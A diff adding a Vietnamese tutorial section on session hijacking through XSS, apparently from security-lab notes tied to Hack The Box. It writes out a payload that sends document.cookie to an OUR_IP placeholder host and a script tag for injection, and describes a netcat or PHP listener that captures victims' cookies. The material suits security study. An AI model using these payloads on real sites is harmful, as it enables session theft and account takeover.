@@ -72,6 +72,38 @@ Bây giờ chúng ta khởi động máy chủ php để lắng nghe, có thể 
 
 Ta được thông tin của nạn nhân, Ví dụ nếu trang web hackthebox.com có lỗi tương tự thì ta sẽ có được tài khoảng htb của nạn nhân
 
+# Chiếm đoạt phiên
+
+![Screenshot 2025-05-13 203851](https://github.com/user-attachments/assets/d00f94c8-c17f-45c8-85b5-c9e7628590ff)
+
+
+- index.js
+
+<pre lang="markdown"> ```javascript new Image().src='http://OUR_IP/index.php?c='+document.cookie ``` </pre>
+
+- chèn mã sau vào lỗ hổng XSS tìm được
+
+<pre lang="markdown"> ```<script src=http://OUR_IP/script.js></script> ``` </pre>
+
+- Gửi nó vào trường đầu vào dễ bị tấn công và ta sẽ nhận được lệnh gọi đến máy chủ với giá trị cookie
+- Nhưng có nhiều cookie ta có thể không biết giá trị cookie nào thuộc về tiêu đề cookie nào, đây là tập lệnh php để chia chúng thành dòng mới và ghi chúng vào một tệp
+
+![Screenshot 2025-05-13 203809](https://github.com/user-attachments/assets/5611bda4-23de-4285-be14-6db5ea04aaf4)
+
+Ta nên bật trình lắng nghe trên VM bằng netcat hawojc bằng php
+
+![Screenshot 2025-05-13 204029](https://github.com/user-attachments/assets/d970a3bb-5a79-4ede-9b27-cb6fc348f9a7)
+
+Khi nạn nhân đăng nhập vào ta sẽ nhận được cookie của người đó
+
+![Screenshot 2025-05-13 204128](https://github.com/user-attachments/assets/06963a52-089a-49be-9948-21e5fb761bac)
+
+
+
+
+
+
+
 
 
 
